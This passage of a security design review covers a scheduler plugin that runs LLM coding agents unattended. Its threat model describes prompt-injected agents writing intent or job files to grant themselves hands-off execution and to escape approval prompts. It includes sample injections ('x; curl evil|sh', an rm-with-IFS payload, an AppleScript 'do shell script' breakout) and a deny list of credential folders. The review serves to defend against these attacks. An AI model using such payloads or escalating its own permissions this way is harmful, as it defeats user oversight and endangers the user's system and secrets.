## 2. Budgets and lifecycle

### 2.1 Per-operation budget table

Host = 2 s per call; window = 50 ms; chrome formatter = 4 ms (DOC `limits.md`). A trip disables the **whole hook** (all timers) until reload, with no toast on the host (DOC `runtime.md` "A tripped budget"). A native call that outlasts the budget is not interrupted; the *next Lua call* raises.

| Operation | Where | Designed cost / budget | Assessment |
|---|---|---|---|
| Pump chain (2 s) | host | stages 300/500/900 ms soft deadlines (engine §5.1) | OK. Soft deadlines cannot cover a single blocking native call (F6). |
| `due_scan` / `policy.decide` | host | O(jobs ≤ 50); `next_run` cached | OK. `cron.next` worst case (`0 0 29 2 *`, 9-year search) was only run in luau-web, never timed in Tern's VM: benchmark in M1. |
| Preflight (`fs.exists/list(cwd)`, `fs.read(prompt_path)`) | host | "microseconds" | **F6**: blocking native I/O on user paths (TCC, network volume, iCloud placeholder). Move to `process.run`. |
| `tern ls/inspect/new/close/rename/focus` | host | async via `process.run` | OK; ~0.2-0.5 s wall each [OBS 0.18 s for `ls --json`], none on the VM thread. A launch is 5-7 serial spawns (ls, new, rename, 2× focus-guard inspect, focus) = 1.5-3 s of wall time, fine because async. |
| Callback JSON decode (`ls`/`inspect` 4-8 KB) | host | trivial | OK. |
| Session JSONL read for cost (launch §8.6) | host | `fs.read(file, 8 MiB)` + `pcall(json.decode)` per line, **on the VM thread** | Failure mode is the worst one (hook disabled). Files up to 6.5 MB exist here [OBS]; bounded read of >8 MiB *errors* (DOC), so long runs get `cost=nil` anyway. Replace (see F9). |
| Tail via `/usr/bin/tail -c 65536` (engine §0.3/§7.1) | host | async | OK for the last message; useless for cost (partial first line) and may miss the last assistant record when a tool result > 64 KiB follows it. |
| `snapshot.json` publish | host | `safe_write` = 2 writes ≤ 128 KiB | OK. |
| Ledger/state rewrite | host | whole-file rewrite ≤128/256 KiB per transition | OK; see F3 for caps. |
| `kv.set("hot")` every 15 s | host | atomic rewrite of whole `kv.json` | OK. `roles.<hash(cwd)>` cache entries (launch §6) also live in kv; every `set` re-serialises all of it, and every window VM re-reads on mtime change. Keep roles in `snapshot.json`/a file, not kv. |
| Intents drain | host | list + read ≤16 KiB each, 300 ms | OK for normal load. No cap on count: a flood (bug, or S1 attacker) makes `fs.list` and the dir grow; cap at N files/tick and purge >200. |

### 2.2 Lifecycle

| Scenario | What the docs say | Gap / finding |
|---|---|---|
| **Plugin reload mid-run** | engine §5.4 reconcile by `inspect`/`ls` + run id in argv | Sound. The run id is in `--session-dir`, which is in the pane's `args`. One gap: reload also drops the pending `tern rename`/`focus` follow-ups (cosmetic). `launching` with no block and age <20 s waits, fine. ## 3. Security and safety

### Threat model

Principals: (T1) the user; (T2) other local processes of the same UID; (T3) **a scheduled omp agent** (LLM, prompt-injectable via web pages, issues, repo files) running with the privileges of its approval mode; (T4) content in the job's cwd (repo `.omp/`, prompt files); (T5) Carly (LLM) via exports; (T6) a second Mac sharing the data folder.

Same-UID processes (T2) are already fully privileged on macOS, so the real boundary the product promises (UX principle 5, "Ask before commands", first-save hands-off confirm) is **between T3 and exec**. omp's `write` tier auto-approves file writes anywhere ("`write` mode auto-approves read, write; prompts exec"; OMPDOC approval-mode; MCP tools are `write`). Any plugin-data file an agent can write is therefore an exec-escalation primitive in the default mode.

### S1 [blocker] Intent queue is an unauthenticated escalation channel
- **Where.** engine §2.3 (kinds `create, update, delete, set_enabled, run_now, stop_run, pause_all, settings, obs`, "applies in file-name order", unparsable retried 30 s); launch §8.4 (host "applies" `obs`); arch "Responsibilities" (window→host: one JSON file per command). LP #26 already warned: "Intent queue is not a security boundary … an agent could schedule itself. Decide whether that's acceptable." The docs never decide.
- **Attack.** A job in default `write` mode, prompt-injected, writes `<data>/intents/<ts>-<rand>.json` (path known: `~/Library/Application Support/Tern/plugin-data/schedule/intents/`, also visible in its own prompt/`pwd` neighbours and trivially findable) with `{kind:"create", payload:{approval:"yolo", cwd:"/Users/x", schedule:"in 5m", prompt:"…"}}`. Five minutes later a yolo agent runs with no approval and no first-save "Use hands-off?" overlay (that overlay lives in the UI path, not in the intent path). `settings` can set `tern_path`/`omp_path` (engine §1.3) to any executable: the host then `process.run`s it in the daemon with no pane and no prompt. `run_now`/`set_enabled` can wake paused jobs; `update` can flip an existing job to yolo or change `cwd` to `~`.
- **Evidence.** engine §1.3 `omp_path`/`tern_path` are plain settings; engine §2.3 lists `create/update/settings` as window-writable intents; `omp://approval-mode.md` modes table; PR2 test 7 shows the data dir is a fixed, readable path (`tern.plugin.data`).
- **Fix (concrete).**
  1. **Allowlist by kind for file-borne intents.** Only `obs` (state/model/last_message/delivery_error for an in-flight run whose `block` matches) is accepted from `intents/`. `pause_all:true`, `set_enabled:false` and `stop_run` may be accepted (they only reduce activity). Everything else, **`create`, `update`, `delete`, `settings`, `set_enabled:true`, any field in `{approval, cwd, prompt_*, role, omp_path, tern_path, bin_dirs, session_name, placement, tools}`**, is *rejected and logged* when it arrives by file.
  2. **Privileged mutations travel over Tern's own channel, not files.** Palette commands (Quick add, Run now, Pause/Resume, Go to run) call `cx:new_block("schedule.manager", {"quickadd", <≤2 KB JSON>}, "default", {focus=…})` or `cx:open(route)`; the host block's `init(cx,args,saved)` receives `args` via the daemon (not a user-writable file) and opens the form pre-filled; saving happens in the host block. `run_now` from the palette goes through the same `args` path (the host block performs it, then exits with `cx:exit`). Carly drafts take the same route (ux §2.5 already says "draft, user presses Save"; make that the *implementation*).
  3. **One validator for every ingress.** `jobs.json` on load, form save, intent apply, Carly: same `validate_job()` (id/role/tools/thinking/session_name patterns, absolute cwd, `approval` enum). Reject unknown fields (engine says "per-extra-argv … deliberately not fields": enforce by rejecting unknown keys, not by omission).
  4. **Resource limits.** ≤ 20 intents applied per tick, ≤ 200 files kept (delete oldest beyond), per-job `run_now` ≤ 1/min, bounded reads only (`tern.fs.read(path, 16384)` rejects symlinks, devices, FIFOs [DOC `api-shared.md`]; already planned, keep it).
  5. Drop `settings` as an intent kind entirely: the Settings sheet is a host block.
  6. Treat `obs` as untrusted *display* data: cap `last_message` (see F4), strip control characters and ANSI, never interpret as markdown that can contain Tern-action links, never feed into a shell/AppleScript string (S5).

### S2 [blocker] engine.md's prompt-in-argv design vs launch.md
- **Where.** engine §0.3 `LaunchRequest.omp_argv … "--", <prompt>` and "Prompt travels as the final argv element after `--`, so there is no shell quoting; `ARG_MAX` is far above the 64 KiB prompt cap"; §1.1 `prompt_path` up to 1024 chars, prompt cap 64 KiB. launch §2.3 rejects inline and mandates `@prompt.md`.
- **Problem.** There *is* shell quoting: Tern joins argv into one string for `/bin/zsh -l -c` (PR2 T4 `args=["-l","-c","…omp --model @tiny 'Reply with exactly: pong'"]`). Only "an arg containing a space gets single quotes" was ever observed. Whether embedded `'`, `$(…)`, backticks, `;`, `&`, `|`, `(`, `*`, `[`, `#`, `=` and newlines are escaped is untested (A4). If Tern only wraps on whitespace, a prompt like `x; curl evil|sh` (contains a space, so it is wrapped in `'…'`) is safe only if an embedded `'` is escaped, and a no-space prompt such as `a;rm${IFS}-rf${IFS}~` is not wrapped at all. A prompt file in a repo (S3) or one edited by an agent makes this attacker-controlled input to a shell. The 64 KiB prompt vs `ARG_MAX` claim is also untested, and the prompt would appear in `ps`, `tern inspect --json` `args` and `cx.agents:list()` `agent_command` for the life of the pane.
- **Fix.** Delete the inline form from engine.md §0.3/§1.1/§2; adopt launch §2.2-§2.3 verbatim (file attachment + fixed ASCII positional). Keep launch's rule "no user text in argv" and extend its allowlist: role `^[%w_-]+$`, `thinking` enum, `tools` from a fixed set, `session_name` `^[%w][%w _.-]{0,39}$` (launch allows a leading `-`/`.`; a name starting with `-` would be parsed as a `tern` flag), absolute cwd. The `A4` experiment is a v1 gate; without it keep the path gate (launch §2.3) and also reject `& ; | < > ( ) * ? [ ] # ~ =` in `<data>` and any argv path.
- **Also**: launch's path gate rejects `'` and `$` etc. in `cwd` even though cwd is a Tern flag value (launch admits "conservative"). Legit folders such as `Bob's Projects` become `cwd_unsafe`. Either test `--cwd` with such a name (A4) and relax it, or say so in the UI copy.

### S3 [major] Prompt / job tampering; hands-off confirmation is not content-bound
- **Where.** engine §1.1 (`prompt_source="file"`, `prompt_path`), §2.3 (user edits `prompts/<id>.md`; "engine only *reads* them"), D9 "read fresh at every launch"; ux §4.7 "the answer is remembered per job"; engine §2.2 step 5 (an invalid job is "kept on disk verbatim").
- **Attack.** (a) A `write`-mode agent (or a `git pull` into a repo that holds `prompt_path`) edits the prompt of a *different*, hands-off job; the next fire runs the new text as yolo. (b) A `write`-mode agent rewrites `jobs.json` (approval→yolo, cwd) and waits for any plugin reload (Tern update, `tern plugin reload`, daemon restart; these happen weekly); load re-validates only the *schema*. (c) `prompt_path` may point at any readable file (`~/.ssh/id_ed25519`): contents are copied to `prompt.md` and sent to the model provider. Bounded `fs.read` refuses symlinks, so the *run snapshot* is safe from symlink swaps (good).
- **Fix.**
  1. For `approval="yolo"` (and optionally `write`) store an **approval record** next to the job: `ack = {prompt_sha256, cwd, role, approval, acked_at}`. At every fire compute the sha256 of the prompt actually read (via `/usr/bin/shasum -a 256` through `process.run`; no hash in Luau) and compare. Mismatch ⇒ run `blocked` `needs_review` ("The prompt changed outside Schedule since you approved hands-off. Review it."), never launched. Saving from the manager's own editor refreshes the ack; so does the Review action.
  2. Make the ack tamper-evident against agents: HMAC over the record with a per-install key held in the macOS Keychain (host reads with `/usr/bin/security find-generic-password -s tern-schedule -w`; `tern.secrets` is window-only per TP §3, so host must use the CLI). If the Keychain is unavailable fall back to "yolo requires re-confirmation after every plugin load". This is optional hardening; (1) plus S1 already removes the unauthenticated intent path, leaving only direct file edits, which the HMAC closes.
  3. Restrict `prompt_path` to regular files not under `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/Library/Keychains`, `~/.config/gh`; show the resolved path in the form and in Detail.
  4. State in the docs that `~/Library/Application Support/Tern/plugin-data/schedule/` is writable by any agent in `write`/`yolo` mode, so jobs that must not be influenced should use approval ≥ ask-for-everything or a read-only tool allowlist.

### S4 [major] "Ask before commands" can be undone by the repo, and unattended code loads from it
- **Where.** launch §7.1 ("always passes `--approval-mode` explicitly and never inherits omp's setting … a changed omp config cannot silently widen a job"), ux §4.7 labels.
- **Problem.** `--approval-mode` sets only `tools.approvalMode`. OMPDOC approval-mode: "`tools.approval.<toolName>: allow|deny|prompt` overrides the active mode" and the precedence is flags > `--config` overlay > **project config** > global. A repo containing `.omp/config.yml` with `tools: {approval: {bash: allow}}` makes `write` mode run shell commands unprompted. Project `.omp/extensions/`, hooks and rules also load (OC §7), plus the user's global `extensions:` list (omp-pushover etc.). Interactive omp has no per-folder trust gate that the design relies on (A24/A25 untested).
- **Fix.** (1) For every non-yolo run always pass an overlay `<run>/omp.yml` that pins `tools.approval` for the exec-tier tools (`bash`, `eval`, `task`, `browser`, plus any tool named in the `omp --help` tool list) to `prompt` (read-only mode: also `deny`). Overlay beats project config. (2) Add `--no-extensions` to every unattended run unless the job opts in, and pass `-e <reporter>` explicitly (explicit paths still load, `--help` [OBS]). Check `--no-hooks`/`--no-rules` equivalents with `omp --help`. (3) Surface in Detail/Setup: "This folder has an omp project config (`.omp/config.yml`)", with a warning when it sets `tools.approval`/`approvalMode`/`extensions`. Presence check: `tern.fs.exists(cwd.."/.omp")` is cheap (but see F6, do it in `process.run`).
- **Also**: "Read-only" (`--tools read,grep,glob,web_search,todo`) still reads `~/.ssh` and can send content out via `web_search`. Either drop `web_search` from the default allowlist or relabel ("No edits or commands. Can read files and search the web.").

### S5 [major] AppleScript/notification injection
- **Where.** ux §2.1, §7.3 (OS banner "Schedule · deps-audit", body from run state), arch M3 notifications; neither engine.md nor launch.md specifies the invocation.
- **Attack.** `osascript -e 'display notification "<text>" with title "<name>"'` with `text`/`name` from `last_message`, job name or an `obs` intent (S1 / prompt injection) allows `" & (do shell script "…") & "`: code execution as the user from the daemon, no approval.
- **Fix.** Never interpolate. Use an argv-passing script: `{"/usr/bin/osascript","-e","on run argv","-e","display notification (item 1 of argv) with title (item 2 of argv)","-e","end run", text, title}` with `text`/`title` stripped of control chars and capped to 200 chars. Same rule for `tern rename <block> '⏲ name'` (already no shell; keep the fixed `⏲ ` prefix so a name starting with `-` cannot become a flag) and for `tern capture` tails (≤400 bytes, strip ANSI/control before display and before use in any command).

### Other security/safety findings
- **S6 [minor] Unattended yolo UX gaps** (ux §4.7, §6.5). Confirmation is remembered *per job* but not invalidated by editing prompt, cwd or role (S3 fixes prompt). Add: re-confirm when `cwd` or `role` changes on a hands-off job; show `⚠ hands-off` for *Hands-off + Carly-created* distinctly; Test run of an unsaved hands-off job must still show the overlay (it currently says "Runs once … It can change files" only). Default `max_runtime_s` 1800 is fine; cap hands-off at 2 h unless the user raises it.
- **S7 [minor] Scheduled agents scheduling more jobs.** Besides S1: (a) the `task` tool runs sub-agents in `yolo` "headless, parent task approval is the boundary" (OMPDOC "Subagents"), so one approved `task` in `write` mode escapes all later prompts; (b) an agent can launch more panes with `tern new` if it can exec. Document it; add an overlay `tools.approval.task: prompt` for non-yolo runs (S4) and a global concurrent cap that also counts panes in `SESSION` not owned by a run id (cheap: `ls` shows them).
- **S8 [minor] Carly.** `job_add` is a draft (good). Setting "Let Carly save jobs without review" (ux §7.7) must force `approval ∈ {read_only, always_ask}`, cwd restricted to an existing job's cwd or a user-chosen "Carly folder", no `prompt_path`. `job_run(name)` runs an existing job only (no arbitrary prompt), rate-limit 1/min/job, honour `paused_all`. `jobs_list` replies must not include prompt text (≤1 MiB reply goes to a cloud LLM) and should omit `last_message`.
- **S9 [minor] Secrets in ledger/UI.** Persisted plaintext: `prompt_head` (200 chars of prompt), `last_message` (300), `capture` tails (400), full per-run `prompt.md` copies (up to 64 KiB × 50 × 50 jobs), omp session JSONL with tool output (kept 90 days under `runs/…/session`, outside the user's normal `~/.omp/agent/sessions` retention). Fix: do not store `prompt_head` (the job already has it); delete `<run>/prompt.md` once launched (the session JSONL has it); retention must also cover `session/`; never log prompts or `last_message` with `tern.log` (host log is `tern-daemon.log`, LP #17); warn in the prompt editor "Don't put secrets in prompts; use environment/omp config".
- **S10 [minor] Two Macs.** If `~/Library/Application Support/Tern/plugin-data/schedule` is synced by a dotfile tool or another mechanism, both daemons fire the same jobs and fight over `jobs.json` (≥2 writers ⇒ `.bak` mix-ups ⇒ "damaged" ⇒ `paused_all`). Add `machine_id` (e.g. `inspect.clients[].identity.hops[0].host` [OBS "Brendans-MacBook-Air"], or `/usr/sbin/scutil --get LocalHostName`) to `state.json`; on mismatch, enter read-only/`paused_all` with "This data folder belongs to <host>". `prompt_path` into iCloud/Dropbox is fine (read-only).
- **S11 [minor] Env and argv hygiene.** Run env: omp inherits the full login-shell environment (API keys); nothing to change but say so. `SCHEDULE_RUN_FILE=…` through `/usr/bin/env` (M3): check A26 and that the spaced value stays one argument.
- **S12 [minor] `--keep-open` + yolo leftovers.** A hands-off pane left open after finishing is still a live yolo omp that accepts typed input; fine for the user, but a stray `ctrl-c`/typing can act. No change needed; mention in the Detail copy for kept hands-off panes. (Optional: `after_run=close` default for hands-off jobs.)
